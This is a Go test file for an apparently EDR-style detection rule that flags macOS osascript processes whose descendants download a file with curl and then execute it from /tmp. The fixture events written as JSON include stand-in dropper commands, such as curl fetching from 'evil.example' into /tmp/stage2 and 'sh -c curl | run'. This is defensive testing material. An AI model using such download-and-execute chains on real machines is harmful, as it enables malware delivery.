package rules

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/store"
)

// TestOsascriptNetworkExec exercises the download-and-exec chain detection. The rule
// fires only when a single osascript process's 30s descendant tree contains BOTH a
// curl/wget exec AND an exec out of a suspicious path — either alone is not enough.
func TestOsascriptNetworkExec_DetectsChain(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// Tree: launchd (1) → osascript (50) → curl (100) + /tmp/stage2 (200)
	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil.example/x"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	f := findings[0]
	assert.Equal(t, "osascript_network_exec", f.RuleID)
	assert.Equal(t, "critical", f.Severity)
	assert.Contains(t, f.Description, "/usr/bin/curl")
	assert.Contains(t, f.Description, "/tmp/stage2")
}

// Negative: osascript alone with a curl child but no temp-path exec. Download without a
// following exec is not a droppers pattern — could be a legitimate script fetch.
func TestOsascriptNetworkExec_DownloadOnlyDoesNotFire(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","https://example.com"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

// Multi-hop chain: osascript → sh → curl + /tmp/stage2 exec via a grandchild. Real
// droppers spawn an intermediate shell; the direct-children-only scan missed this until
// the BFS fix.
func TestOsascriptNetworkExec_DetectsGrandchildChain(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":60,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":60,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl | run"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":60}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":60,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 4000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":60}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 4100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":60,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1, "BFS traversal must see the grandchild curl + /tmp/stage2")
	assert.Contains(t, findings[0].Description, "/usr/bin/curl")
	assert.Contains(t, findings[0].Description, "/tmp/stage2")
}

// Negative: temp-path exec without the download child. The parent suspicious_exec rule
// covers this case; osascript_network_exec stays silent.
func TestOsascriptNetworkExec_TempExecWithoutDownloadDoesNotFire(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}
